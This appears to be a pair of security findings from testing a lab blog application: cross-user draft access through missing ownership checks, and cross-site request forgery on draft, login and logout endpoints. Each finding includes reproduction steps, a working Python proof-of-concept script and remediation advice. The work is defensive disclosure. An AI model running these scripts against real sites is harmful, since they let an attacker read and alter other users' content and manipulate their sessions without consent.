title: Broken Access Control in Draft Workflow Enables Cross-User Draft Read and Modification
description:
A broken access control vulnerability was confirmed in the draft management workflow of the blog application. Authenticated standard users can access other users’ draft listings and directly open draft edit pages for drafts they do not own.

The issue affects both user-scoped listing routes and object-scoped edit routes. The application accepts a user-controlled username in the `/<username>/drafts` path and a user-controlled draft identifier in `/edit_draft/<id>` without enforcing ownership checks. As a result, one user can view another user’s draft metadata, retrieve draft contents intended to remain private, and submit unauthorized edits to another user’s draft.

The vulnerability was validated using two low-privilege accounts. Each account was able to access the other user’s draft listing, load the other user’s draft editor, and modify the other user’s draft content. The unauthorized changes were then confirmed from the victim account.
evidence:
This vulnerability allows any authenticated user to access and tamper with draft content belonging to other users.

Confidentiality impact:
- Exposure of private, unpublished draft titles and content across accounts
- Enumeration of additional draft records through predictable sequential identifiers

Integrity impact:
- Unauthorized modification of other users’ drafts
- Defacement, sabotage, or insertion of misleading or malicious content into unpublished material

Business impact:
- Loss of trust in tenant and user isolation
- Exposure of sensitive unpublished content such as internal notes, embargoed posts, or editorial drafts
- Risk of workflow disruption, reputational damage, and content integrity failures if attackers alter or poison other users’ drafts

The root cause is missing object-level authorization on draft resources and missing subject-to-object binding on user-scoped listing routes.

Confirmed affected behaviors:
- `GET /<username>/drafts` returns another user’s draft listing to any authenticated user
- `GET /edit_draft/<id>` returns another user’s draft title and content to any authenticated user
- `POST /edit_draft/<id>` accepts and persists edits to another user’s draft from any authenticated user

The application relies on user-supplied path components to identify the target user or draft object, but does not verify that the authenticated requester owns the referenced resource. Because draft identifiers are predictable and sequential, authenticated users can also enumerate additional draft objects by incrementing the draft ID.

This is a direct object reference vulnerability with a broken authorization control pattern. Authentication is required, but authorization is not correctly enforced at the object level. The result is horizontal privilege escalation between standard users.
steps:
To reproduce: 1. Register two standard accounts: - User A: `alice6qnyfj` / `Password123!` - User B: `bobzt75qp` / `Password123!` 2. Ensure each account has at least one draft: - User A draft ID: `4` - User B draft ID: `5` 3. Log in as User A and request User B’s draft listing: - `GET /bobzt75qp/drafts` - Observe HTTP 200 and a listing containing title `B draft marker 456` with edit link `/edit_draft/5` 4. Still as User A, request User B’s draft editor: - `GET /edit_draft/5` - Observe HTTP 200 and draft content belonging to User B 5. Still as User A, modify User B’s draft: - `POST /edit_draft/5` - Submit: - `title=unauth change to B by A` - `content=A modified draft 5 without ownership` - Observe redirect indicating the update was accepted 6. Log in as User B and request `GET /edit_draft/5` - Observe that the unauthorized changes submitted by User A are visible 7. Repeat the same sequence in the opposite direction: - Log in as User B - `GET /alice6qnyfj/drafts` - `GET /edit_draft/4` - `POST /edit_draft/4` with attacker-controlled values - Log in as User A and confirm the unauthorized changes are visible 8. Optional enumeration check: - As any authenticated user, request `/edit_draft/1` through `/edit_draft/7` - Observe multiple HTTP 200 responses with edit forms, demonstrating enumerable object identifiers ``` import re import requests from urllib.parse import urljoin BASE = "http://blog:5003" USER_A = {"username": "alice6qnyfj", "password": "Password123!"} USER_B = {"username": "bobzt75qp", "password": "Password123!"} DRAFT_A_ID = 4 DRAFT_B_ID = 5 ORIG_A = { "title": "A draft marker 123", "content": "content from A", } ORIG_B = { "title": "B draft marker 456", "content": "content from B", } ATTACK_A_TO_B = { "title": "unauth change to B by A", "content": "A modified draft 5 without ownership", } ATTACK_B_TO_A = { "title": "unauth change to A by B", "content": "B modified draft 4 without ownership", } def login(session: requests.Session, creds: dict) -> None: resp = session.post( urljoin(BASE, "/login"), data={"username": creds["username"], "password": creds["password"]}, allow_redirects=False, timeout=10, ) if resp.status_code != 302: raise RuntimeError(f"Login failed for {creds['username']}: {resp.status_code}") def get_text_between(pattern: str, text: str) -> str: m = re.search(pattern, text, re.I | re.S) return m.group(1).strip() if m else "" def read_listing(session: requests.Session, username: str) -> str: resp = session.get(urljoin(BASE, f"/{username}/drafts"), timeout=10) print(f"[listing] GET /{username}/drafts -> {resp.status_code}") print("first listed title:", get_text_between(r"

(.*?)

", resp.text)) return resp.text def read_draft(session: requests.Session, draft_id: int) -> tuple[int, str, str]: resp = session.get(urljoin(BASE, f"/edit_draft/{draft_id}"), timeout=10) title = get_text_between(r'name="title"[^>]*value="([^"]+)"', resp.text) content = get_text_between(r']*name="content"[^>]*>(.*?)', resp.text) print(f"[read] GET /edit_draft/{draft_id} -> {resp.status_code} | title={title!r} | content={content!r}") return resp.status_code, title, content def write_draft(session: requests.Session, draft_id: int, payload: dict) -> int: resp = session.post( urljoin(BASE, f"/edit_draft/{draft_id}"), data=payload, allow_redirects=False, timeout=10, ) print(f"[write] POST /edit_draft/{draft_id} -> {resp.status_code} | location={resp.headers.get('Location')}") return resp.status_code def enumerate_drafts(session: requests.Session, start: int = 1, end: int = 7) -> None: for draft_id in range(start, end + 1): resp = session.get(urljoin(BASE, f"/edit_draft/{draft_id}"), timeout=10) title = get_text_between(r"(.*?)", resp.text) print(f"[enum] /edit_draft/{draft_id} -> {resp.status_code} | page_title={title!r}") def main() -> None: session_a = requests.Session() session_b = requests.Session() login(session_a, USER_A) login(session_b, USER_B) print("\\n== Unauthorized listing access ==") read_listing(session_a, USER_B["username"]) read_listing(session_b, USER_A["username"]) print("\\n== Unauthorized read access ==") read_draft(session_a, DRAFT_B_ID) read_draft(session_b, DRAFT_A_ID) print("\\n== Unauthorized write access ==") write_draft(session_a, DRAFT_B_ID, ATTACK_A_TO_B) _, victim_b_title, victim_b_content = read_draft(session_b, DRAFT_B_ID) print("victim B sees modified values:", victim_b_title, "|", victim_b_content) write_draft(session_b, DRAFT_A_ID, ATTACK_B_TO_A) _, victim_a_title, victim_a_content = read_draft(session_a, DRAFT_A_ID) print("victim A sees modified values:", victim_a_title, "|", victim_a_content) print("\\n== Sequential ID enumeration ==") enumerate_drafts(session_a, 1, 7) print("\\n== Restore original content ==") write_draft(session_a, DRAFT_B_ID, ORIG_B) write_draft(session_b, DRAFT_A_ID, ORIG_A) read_draft(session_a, DRAFT_A_ID) read_draft(session_b, DRAFT_B_ID) if __name__ == "__main__": main() ```

metadata.remediation:
1. Enforce object-level authorization on every draft access path.
   - Before returning or modifying a draft, verify that the authenticated user is authorized to access the specific draft record.
   - Reject requests for drafts not owned by the current user unless an explicit privileged role is intended and enforced.

2. Enforce ownership checks on user-scoped listing routes.
   - Validate that the authenticated user is permitted to request the referenced `/<username>/drafts` resource.
   - Prefer deriving the current user from the server-side session instead of trusting a user-controlled path segment for sensitive listings.

3. Centralize authorization logic.
   - Apply a shared authorization layer for both read and write operations so that listing, editing, and any future delete/publish actions use the same ownership enforcement model.

4. Reduce identifier exposure.
   - Replace predictable sequential draft identifiers with non-enumerable identifiers where practical.
   - Treat opaque identifiers as defense in depth only; they do not replace authorization checks.

5. Add negative authorization test coverage.
   - Implement regression tests confirming that one standard user cannot list, read, or modify another user’s drafts.
   - Include tests for direct object reference manipulation across all draft-related endpoints.

6. Review adjacent endpoints for the same root cause.
   - Audit all resource-based routes, including any publish, delete, preview, or administrative content actions, for missing ownership checks.

title: Cross-Site Request Forgery on Draft Management Endpoints
description:
The application does not enforce effective cross-site request forgery protections on authenticated state-changing endpoints. Rendered forms for draft management do not include anti-CSRF tokens, and server-side processing accepts cross-origin form submissions without rejecting foreign Origin or Referer values.

This weakness was confirmed against draft creation and draft editing functionality. When a victim browser was authenticated to the application, a page hosted on a different origin successfully caused the browser to submit POST requests to the application and perform state changes in the victim account. Supporting tests also showed cross-site login and logout behavior, indicating the CSRF exposure is systemic rather than isolated to a single endpoint.
evidence:
An attacker can cause authenticated users to perform unintended actions within their own accounts by inducing them to visit an attacker-controlled page. Confirmed impact includes unauthorized creation of drafts and unauthorized modification of existing drafts. Supporting evidence also showed that a victim browser could be logged out cross-site and logged into an attacker-chosen account.

For a content-management workflow, this creates a real integrity risk: an attacker can plant fraudulent content, tamper with draft material, disrupt user workflows, and manipulate account session state without the victim intentionally interacting with the application itself.

The vulnerable behavior stems from missing request origin validation and the absence of anti-CSRF tokens on state-changing routes. The application relies on the browser's ambient authority by accepting cookie-authenticated POST requests without requiring a per-request secret that an external origin cannot provide.

Confirmed primary exploitation paths:
- POST /create_draft accepted a cross-origin form submission and created a new draft in the victim account with the title csrf_create_probe.
- POST /edit_draft/13 accepted a cross-origin form submission and changed an existing victim draft to title csrf_edit_probe with body cross-site edit probe.

Supporting evidence demonstrated the same root cause across adjacent session-sensitive actions:
- GET /logout was triggerable cross-site and logged the victim out.
- POST /login accepted a cross-origin form submission and logged the browser into an attacker-chosen account.

The session cookie was observed with HttpOnly and Path attributes but without SameSite, and the browser used during validation sent that cookie on cross-site form submissions. Combined with the lack of CSRF tokens and the absence of effective Origin/Referer enforcement, this made authenticated cross-site state change fully exploitable.
steps:
To reproduce: 1. Authenticate to http://blog:5003 in a browser as a normal user and keep that session active. 2. Save the Python proof-of-concept script locally and start it. By default it serves a foreign-origin page on http://127.0.0.1:8000. 3. In the same authenticated browser, visit one of the following URLs served by the proof-of-concept server: - http://127.0.0.1:8000/?mode=create - http://127.0.0.1:8000/?mode=edit&draft_id=13 - http://127.0.0.1:8000/?mode=logout - http://127.0.0.1:8000/?mode=login 4. Observe that the page auto-submits a form to the application from a different origin. 5. Validate impact: - For create mode, return to the victim account and confirm a new draft titled csrf_create_probe was created. - For edit mode, inspect the targeted draft and confirm its title was changed to csrf_edit_probe and its content to cross-site edit probe. - For logout mode, confirm the authenticated session was terminated. - For login mode, confirm the browser was logged into the operator-supplied account. The issue is confirmed if these actions succeed without any anti-CSRF token, user re-authentication step, or server-side rejection based on foreign Origin or Referer values. ``` #!/usr/bin/env python3 import html from http.server import BaseHTTPRequestHandler, HTTPServer from urllib.parse import parse_qs, urlparse HOST = "127.0.0.1" PORT = 8000 TARGET = "http://blog:5003" def page_for(mode: str, params: dict) -> str: if mode == "create": action = f"{TARGET}/create_draft" form = """
""".format(action=html.escape(action, quote=True)) title = "Create Draft CSRF" detail = "This page submits a cross-site POST to /create_draft." elif mode == "edit": draft_id = params.get("draft_id", ["13"])[0] action = f"{TARGET}/edit_draft/{draft_id}" form = """
""".format(action=html.escape(action, quote=True)) title = "Edit Draft CSRF" detail = f"This page submits a cross-site POST to /edit_draft/{html.escape(draft_id)}." elif mode == "login": username = params.get("username", ["operator_account"])[0] password = params.get("password", ["Password123!"])[0] action = f"{TARGET}/login" form = """
""".format( action=html.escape(action, quote=True), username=html.escape(username, quote=True), password=html.escape(password, quote=True), ) title = "Login CSRF" detail = "This page submits a cross-site POST to /login with operator-supplied credentials." elif mode == "logout": action = f"{TARGET}/logout" form = """
""".format(action=html.escape(action, quote=True)) title = "Logout CSRF" detail = "This page triggers cross-site logout via /logout." else: title = "CSRF PoC Index" detail = "Choose one of the modes below." form = """
  • Create Draft CSRF
  • Edit Draft CSRF
  • Logout CSRF
  • Login CSRF
""" return f""" {title}

{title}

{detail}

{form} """ class Handler(BaseHTTPRequestHandler): def do_GET(self): parsed = urlparse(self.path) params = parse_qs(parsed.query) mode = params.get("mode", ["index"])[0] body = page_for(mode, params).encode() self.send_response(200) self.send_header("Content-Type", "text/html; charset=utf-8") self.send_header("Content-Length", str(len(body))) self.end_headers() self.wfile.write(body) def log_message(self, format, *args): return def main(): server = HTTPServer((HOST, PORT), Handler) print(f"Serving CSRF proof of concept on http://{HOST}:{PORT}") print("Open one of the following in a browser that is already using http://blog:5003:") print(f" http://{HOST}:{PORT}/?mode=create") print(f" http://{HOST}:{PORT}/?mode=edit&draft_id=13") print(f" http://{HOST}:{PORT}/?mode=logout") print(f" http://{HOST}:{PORT}/?mode=login&username=operator_account&password=Password123!") server.serve_forever() if __name__ == "__main__": main() ```

metadata.remediation:
1. Enforce anti-CSRF protection on every state-changing endpoint.
   - Require a strong, unpredictable CSRF token for all authenticated POST, PUT, PATCH, and DELETE requests.
   - Bind the token to the user session and validate it server-side.
   - Reject requests with missing, invalid, or reused tokens as appropriate.

2. Enforce Origin and Referer validation.
   - For state-changing requests, verify that the Origin header matches the application origin.
   - Where Origin is absent, validate Referer strictly.
   - Reject requests from foreign origins and avoid permissive fallback behavior.

3. Harden session cookies.
   - Set SameSite=Lax or SameSite=Strict on the session cookie where application behavior permits.
   - In production, serve the application only over HTTPS and set the Secure attribute on cookies.

4. Eliminate unsafe state changes over GET.
   - Convert logout to a POST action protected by CSRF defenses.
   - Review all session and account actions to ensure GET and HEAD requests do not have side effects.

5. Add regression tests.
   - Add automated tests confirming that cross-origin form submissions to /create_draft, /edit_draft/<id>, /login, and logout-equivalent actions are rejected unless valid CSRF defenses are satisfied.

6. Retest after remediation.
   - Verify that foreign-origin auto-submitted forms no longer create or modify drafts, no longer alter session state, and are rejected consistently across all authenticated workflows.
